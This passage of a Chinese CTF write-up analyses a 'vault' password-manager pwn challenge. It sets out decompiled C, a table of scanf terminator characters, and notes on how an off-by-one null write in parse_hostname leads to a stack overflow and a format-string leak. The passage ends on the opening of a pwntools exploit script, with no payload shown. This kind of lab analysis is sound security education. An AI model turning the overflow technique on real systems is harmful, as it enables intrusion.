      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">pwd_len</span> <span class="o">&amp;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">pwd_data</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pwd_data</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">4</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">pwd_len</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="o">*</span><span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">pwd_data</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">pwd_len</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
          <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pwd_data</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="n">s</span><span class="p">[</span><span class="mh">0x17F</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice."</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">parse_hostname</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">){</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">haystack</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-28h]</span>
  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>

  <span class="n">haystack</span> <span class="o">=</span> <span class="n">url</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"://"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
    <span class="n">haystack</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="sc">':'</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">haystack</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)(</span><span class="n">v4</span> <span class="o">-</span> <span class="n">haystack</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x80</span> <span class="p">)</span>
      <span class="n">n</span> <span class="o">=</span> <span class="mh">0x7FLL</span><span class="p">;</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">haystack</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">haystack</span><span class="p">,</span> <span class="mh">0x80uLL</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mh">0x7F</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">add_entry</span><span class="p">(){</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">erroinfo</span><span class="p">;</span> <span class="c1">// rdi</span>
  <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="k">struct</span> <span class="n">Entry</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">;</span> <span class="c1">// r12</span>
  <span class="kt">size_t</span> <span class="n">pwd_len</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">size_t</span> <span class="n">n_count</span><span class="p">;</span> <span class="c1">// rdx</span>

  <span class="n">erroinfo</span> <span class="o">=</span> <span class="s">"Max entries reached"</span><span class="p">;</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="n">num_entries</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">num_entries</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
    <span class="k">goto</span> <span class="n">jmp_ret</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"URL: "</span><span class="p">);</span>
  <span class="n">erroinfo</span> <span class="o">=</span> <span class="s">"Invalid Url"</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%255s"</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="k">goto</span> <span class="n">jmp_ret</span><span class="p">;</span>
  <span class="n">ptr1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">entries</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
  <span class="n">parse_hostname</span><span class="p">(</span><span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%255s"</span><span class="p">,</span> <span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">pwd</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">erroinfo</span> <span class="o">=</span> <span class="s">"Invalid Password"</span><span class="p">;</span>
<span class="nl">jmp_ret:</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">erroinfo</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">pwd_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">pwd</span><span class="p">);</span>                  <span class="c1">// pwd</span>
  <span class="n">n_count</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">pwd_size</span> <span class="o">=</span> <span class="n">pwd_len</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">pwd_len</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">do</span>
    <span class="p">{</span>
      <span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">pwd</span><span class="p">[</span><span class="n">n_count</span><span class="p">]</span> <span class="o">^=</span> <span class="n">global_key</span><span class="p">[</span><span class="n">n_count</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
      <span class="o">++</span><span class="n">n_count</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">pwd_len</span> <span class="o">!=</span> <span class="n">n_count</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="o">++</span><span class="n">num_entries</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-34h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-30h]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">setup</span><span class="p">();</span>
  <span class="n">init_key</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"1. Add Entry"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"2. View Entries"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"3. Exit"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice"</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">view_entries</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">add_entry</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice."</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Goodbye Soldier!"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<ul>
  <li>简单记录</li>
</ul>

<p>‍</p>

<p>这些字符会导致 <code class="language-plaintext highlighter-rouge">scanf("%s", ...)</code>​ <strong>停止读取</strong>（即“截断”）当前输入字符串：</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>ASCII 字符</th>
      <th>描述</th>
      <th>十六进制</th>
      <th>十进制</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x09</code>​</td>
      <td>制表符（Tab）</td>
      <td>​<code class="language-plaintext highlighter-rouge">\t</code>​</td>
      <td>9</td>
    </tr>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x0A</code>​</td>
      <td>换行符（LF）</td>
      <td>​<code class="language-plaintext highlighter-rouge">\n</code>​</td>
      <td>10</td>
    </tr>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x0B</code>​</td>
      <td>垂直制表符</td>
      <td>​<code class="language-plaintext highlighter-rouge">\v</code>​</td>
      <td>11</td>
    </tr>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x0C</code>​</td>
      <td>换页符</td>
      <td>​<code class="language-plaintext highlighter-rouge">\f</code>​</td>
      <td>12</td>
    </tr>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x0D</code>​</td>
      <td>回车符（CR）</td>
      <td>​<code class="language-plaintext highlighter-rouge">\r</code>​</td>
      <td>13</td>
    </tr>
    <tr>
      <td>​<code class="language-plaintext highlighter-rouge">0x20</code>​</td>
      <td>空格</td>
      <td>​<code class="language-plaintext highlighter-rouge">' '</code>​</td>
      <td>32</td>
    </tr>
  </tbody>
</table></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">terminators</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="se">\t</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Tab       (0x09)
</span>    <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Newline   (0x0A)
</span>    <span class="sh">'</span><span class="se">\v</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Vertical Tab (0x0B)
</span>    <span class="sh">'</span><span class="se">\f</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Form Feed (0x0C)
</span>    <span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Carriage Return (0x0D)
</span>    <span class="sh">'</span><span class="s"> </span><span class="sh">'</span>    <span class="c1"># Space     (0x20)
</span><span class="p">]</span>
<span class="n">ascii_values</span> <span class="o">=</span> <span class="p">[</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">terminators</span><span class="p">]</span>


<span class="c1"># s = set(list('ABCDAAA'))
# python 去重
</span></pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>存在一个栈溢出，可以绕过canary 但是存在pie,还有 \x00 截断</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">parse_hostname</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">haystack</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-28h]</span>
  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>

  <span class="n">haystack</span> <span class="o">=</span> <span class="n">tmp_url</span><span class="p">;</span> <span class="c1">// tmp_url 最大 0xff, </span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">tmp_url</span><span class="p">,</span> <span class="s">"://"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
    <span class="n">haystack</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="sc">':'</span><span class="p">);</span> <span class="c1">//假设在 0x80 匹配到 : // v4 = 0x80</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>                                     <span class="c1">// 存在 v4</span>
  <span class="p">{</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">haystack</span><span class="p">;</span>                          <span class="c1">// n = 0x80 - 0x00  = 0x80</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)(</span><span class="n">v4</span> <span class="o">-</span> <span class="n">haystack</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x80</span> <span class="p">)</span> <span class="c1">// 不大于 所有 n 不会改变</span>
      <span class="n">n</span> <span class="o">=</span> <span class="mh">0x7FLL</span><span class="p">;</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">haystack</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// ptr[0x80] = 0; 这里已经属于 pwd 字段了，所以说 url 空间被填满</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">haystack</span><span class="p">,</span> <span class="mh">0x80uLL</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mh">0x7F</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">add_entry</span><span class="p">(){</span>
	<span class="p">......</span>
	<span class="n">ptr1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">entries</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
  	<span class="n">parse_hostname</span><span class="p">(</span><span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">);</span>
  	<span class="n">printf</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">);</span>
  	<span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%255s"</span><span class="p">,</span> <span class="n">ptr1</span><span class="o">-&gt;</span><span class="n">pwd</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span> <span class="c1">// url 和 pwd 中间没有\x00 截断了</span>
    <span class="p">......</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">view_entries</span><span class="p">(){</span>
	<span class="p">....</span>
	<span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mh">0x188</span><span class="p">];</span>
	<span class="p">....</span>
	<span class="n">str_n</span> <span class="o">=</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x180uLL</span><span class="p">,</span> <span class="s">"Hostname:  %s</span><span class="se">\n</span><span class="s">Password:    "</span><span class="p">,</span> <span class="n">v0</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">);</span> <span class="c1">// 由于 url 和 pwd 没有截断算一个整体，所以最大%s字符串长度0x88+0x100+原本的字符，明显溢出</span>
	<span class="c1">// 0x180 是指格式化之后最终copy 到 stack 上的数据，str_n 是指实际格式化后的总长度</span>
	<span class="c1">// str_n 可能会 大于 0x180</span>
	<span class="p">....</span> 
	<span class="n">pwd_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">pwd_data</span><span class="p">);</span> <span class="c1">//长度多少就溢出多少</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>如果溢出修改原本的寄存器值是会出现任意地址泄露？</p>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409105932-o7eq7ft.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409105932-o7eq7ft.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409105942-xoxvzma.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409105942-xoxvzma.png" alt="image" loading="lazy"></a></p>

<p>​​</p>

<ul>
  <li>转化成格式串字符串漏洞</li>
</ul>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409134722-y6hp192.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250409134722-y6hp192.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="n">cdl</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">'</span><span class="s">./glibc/libc.so.6</span><span class="sh">'</span><span class="p">)</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./vault</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="c1">#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
